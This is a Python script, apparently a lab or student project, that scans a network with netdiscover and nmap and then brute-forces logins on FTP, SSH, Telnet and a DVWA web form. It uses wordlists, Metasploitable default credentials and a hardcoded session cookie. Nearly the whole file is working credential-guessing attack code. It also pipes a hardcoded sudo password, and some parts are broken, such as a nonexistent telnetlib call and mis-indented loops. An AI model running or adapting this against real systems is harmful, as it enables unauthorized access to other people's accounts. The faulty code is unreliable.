#!/usr/bin/python3

import nmap, paramiko, sys, os, socket, telnetlib, requests, datetime, time, ftplib
global ip, line
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW

def menu():
    global line
    line = "\n----------------------------------------\n"
    print(line)
    print("[1] Start Scan.")
    print("[2] View Previous Scan Results.")
    print("[3] Quit.")

def printmenu2():
    print(f"{BLUE}[*] Which OPEN port would you like to perform a Brute Force Attack on?\n" + Fore.RESET)
    print("[1] FTP - Port 21.")
    print("[2] SSH - Port 22")
    print("[3] Telnet - Port 23")
    print("[4] HTTP - Port 80.")
    print("[5] Quit.")

def option1():
    sudoPassword = 'kali'
    command = 'netdiscover -r 192.168.220.128/24 -P'

    os.system('echo %s|sudo -S %s' % (sudoPassword, command))

    outfile = open('/home/kali/Desktop/results.txt', 'a')
    line = "\n----------------------------------------\n"
    print(line)
    outfile.write(line)

    now = datetime.datetime.now()
    print(now.strftime("%d-%m-%y %H:%M:%S"))
    outfile.write(now.strftime("%y-%m-%d %H:%M:%S"))

    nmScan = nmap.PortScanner()

    global ip
    ip = input(f"{BLUE}[*] Please input the IP address you wish to scan: \n" + Fore.RESET)

    start_time = time.time()

    nmScan.scan(ip, '21, 22, 23, 80,')

    for host in nmScan.all_hosts():
        print(line)
        outfile.write(line)
        print('Host : %s (%s)' % (ip, nmScan[ip].hostname()))
        outfile.write('Host : %s (%s)' % (ip, nmScan[ip].hostname()) + '\n')
    print('State : %s' % nmScan[ip].state())
    outfile.write('State : %s' % nmScan[ip].state() + '\n')
    for proto in nmScan[ip].all_protocols():
        print('----------')
    print('Protocol : %s' % proto)
    outfile.write('Protocol : %s' % proto + '\n')

    lport = nmScan[ip][proto].keys()
    sorted(lport)
    for port in lport:
        print(f'{YELLOW}Port : %s\tstate : %s\n' % (port, nmScan[ip][proto][port]['state'] + Fore.RESET))
        outfile.write('Port : %s\tstate : %s\n' % (port, nmScan[ip][proto][port]['state']) + '\n')
    outfile.close()

    end_time = time.time()
    print("Time taken to run: {}".format(end_time - start_time) + " seconds")

    menu2()

def option2():
    with open('/home/kali/Desktop/results.txt', 'r') as results:
        output = results.read()
        print(output)
    results.close()

def ssh_connect(username, password, host):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    code = 0
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        # [*] Authentication Failed ...
        code = 1
    except socket.error:
        # [*] Connection Failed ... Host Down
        code = 2

    ssh.close()
    return code

def bruteforceSSH():
    start_time = time.time()
    outfile = open('/home/kali/Desktop/results.txt', 'a')
    line = "\n----------------------------------------\n"

    filefolderU = '/home/kali/Desktop/'
    filefolder = '/home/kali/Desktop/'

    print(line)
    outfile.write(line)
    print(f"{YELLOW}[*] SSH Brute Force [*]" + Fore.RESET)
    outfile.write("[*] SSH Brute Force [*]")
    print(line)
    outfile.write(line)

    try:
        host = ip
        input_fileU = os.path.join(filefolderU, 'usernamelist')
        input_file = os.path.join(filefolder, 'passwordlist')
        if os.path.exists(input_file) == False:
            print("\n[*] File Path Does Not Exist !!!")
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n[*] User Requested An Interrupt")
        sys.exit(3)
    print("")

    with open(input_fileU) as userlist:
        for u in userlist:
            username = u.strip("\n")
            with open(input_file) as passlist:
                for i in passlist:
                    password = i.strip("\n")
                    try:
                        response = ssh_connect(username, password, host)

                        if response == 0:
                            print(f"{GREEN}%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
                            outfile.write("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
                            print(f"{BLUE}The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!" + Fore.RESET)
                            outfile.write("The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!")
                            end_time = time.time()
                            print("Time taken to run: {}".format(end_time - start_time) + " seconds")
                            sys.exit(0)
                        elif response == 1:
                            print(f"{RED}%s[*] User: %s [*] Pass: %s => Login Incorrect !! <= %s" % (line, username, password, line))

                        elif response == 2:
                            print("[*] Connection Could Not Be Established To Address: %s" % (host))
                            sys.exit(1)
                    except Exception:
                        sys.exit(2)
    outfile.close()


def bruteforceTelnet():
    start_time = time.time()
    outfile = open('/home/kali/Desktop/results.txt', 'a')
    line = "\n----------------------------------------\n"

    print(line)
    outfile.write(line)
    print(f"{YELLOW}[*] Telnet Brute Force [*]" + Fore.RESET)
    outfile.write("[*] Telnet Brute Force [*]")
    print(line)
    outfile.write(line)

    print("Starting Client...")
    host = ip
    timeout = 120
    port = "23"
    user = "msfadmin"
    password = "msfadmin"

    print("Connecting...")

    try:
        tn = telnetlib.TelnetLogin(host, port, user, password)
        tn.read_until("metasploitable login: ")
        tn.write(user + "\n")
        print("Username entered")
        response = tn.read_until("Password: ")
        print(str(response))
        tn.write(password + "\n")
        print("Password Entered")
        result = tn.expect([b"Last login: "], timeout)
        if (result[0] >= 0):
            print("Telnet login successful on %s:%s with username %s and password %s" % (host, port, user, password))
            end_time = time.time()
            print("Time taken to run: {}".format(end_time - start_time) + " seconds")
    except Exception:
        print("socket timeout")
    else:
        print("Sending Commands...")
        tn.write("Mycommand".encode('ascii') + b"\r")
        print("Reading...")
        output = tn.read_until("commandBash>", timeout )
        tn.close()
        print(output)
        print("Done")

def bruteforceHTTP():
    start_time = time.time()
    outfile = open('/home/kali/Desktop/results.txt', 'a')
    line = "\n----------------------------------------\n"

    print(line)
    outfile.write(line)
    print(f"{YELLOW}[*] HTTP Brute Force [*]" + Fore.RESET)
    outfile.write("[*] HTTP Brute Force [*]")
    print(line)
    outfile.write(line)

    URL = "http://" + ip + "/dvwa/vulnerabilities/brute/"

    filefolderU = '/home/kali/Desktop/'
    filefolder = '/home/kali/Desktop/'

    try:
        input_fileU = os.path.join(filefolderU, 'usernamelist')
        input_file = os.path.join(filefolder, 'passwordlist')
        if os.path.exists(input_file) == False:
            print("\n[*] File Path Does Not Exist !!!")
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n[*] User Requested An Interrupt")
        sys.exit(3)

    cookies = {
        'PHPSESSID':'0ff401f7954e8bbc0d7b0d338fa3e442',
        'security':'high'
    }

    with open(input_fileU) as userlist:
        for u in userlist:
            username = u.strip("\n")
            with open(input_file) as passlist:
                for i in passlist:
                    password = i.strip("\n")
                    print(f"{RED}Trying: Username: {username} and Password: {password}" + Fore.RESET)
                    payload = f'?username={username}&password={password}&Login=Login'
                    req = requests.get(URL + payload, cookies=cookies)
                    if not 'incorrect' in req.text:
                        print(f"{GREEN}Valid Credentials: {username}:{password}" + Fore.RESET)
                        outfile.write("Valid Credentials: {username}:{password}")
                        print(f"{BLUE}The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!" + Fore.RESET)
                        outfile.write("The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!")
                        end_time = time.time()
                        print("Time taken to run: {}".format(end_time - start_time) + " seconds")
                        sys.exit()

def bruteforceFTP():
    start_time = time.time()
    outfile = open('/home/kali/Desktop/results.txt', 'a')
    line = "\n----------------------------------------\n"

    print(line)
    outfile.write(line)
    print(f"{YELLOW}[*] FTP Brute Force [*]" + Fore.RESET)
    outfile.write("[*] FTP Brute Force [*]")
    print(line)
    outfile.write(line)

    hostname = ip
    passwordFile = '/home/kali/Desktop/ftp'
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print(f"{RED}[+] Trying: " + str(userName) +" : " + str(passWord) + Fore.RESET)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print(f"{GREEN}FTP Login Successful: " +str(userName) + " : " + str(passWord) + Fore.RESET)
            ftp.quit()
            end_time = time.time()
            print("Time taken to run: {}".format(end_time - start_time) + " seconds")
            print(f"{BLUE}The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!" + Fore.RESET)
            outfile.write("The password has been brute forced. We highly recommend that you change your credentials immediately to something much stronger!")
            sys.exit()
        except Exception:
            pass

def menu2():
    printmenu2()
    print('-------------------------------')
    choice = int(input(f"{BLUE}[*] Please select an option: \n" + Fore.RESET))

    while choice !=0:
        if choice == 1:
            print("FTP on Port 21 has been chosen.")
            bruteforceFTP()
            break
        elif choice == 2:
            print("SSH on Port 22 has been chosen.\n")
            bruteforceSSH()
            break
        elif choice == 3:
            print("Telnet on Port 23 has been chosen.")
            bruteforceTelnet()
            break
        elif choice == 4:
            print("HTTP on Port 80 has been chosen.")
            bruteforceHTTP()
            break
        elif choice == 5:
            print("Thanks for using this program, good bye!")
            quit()
        else:
            print("Invalid option. \n")

menu()
print('-------------------------------')
option = int(input(f"{BLUE}[*] Please select an option: \n" + Fore.RESET))

while option !=0:
    if option == 1:
        print("Option 1 has been called.\n")
        option1()
        break
    elif option == 2:
        print("Option 2 has been called.\n")
        option2()
        break
    elif option == 3:
        print("Thanks for using this program, good bye!\n")
        quit()
    else:
        print("Invalid option. \n")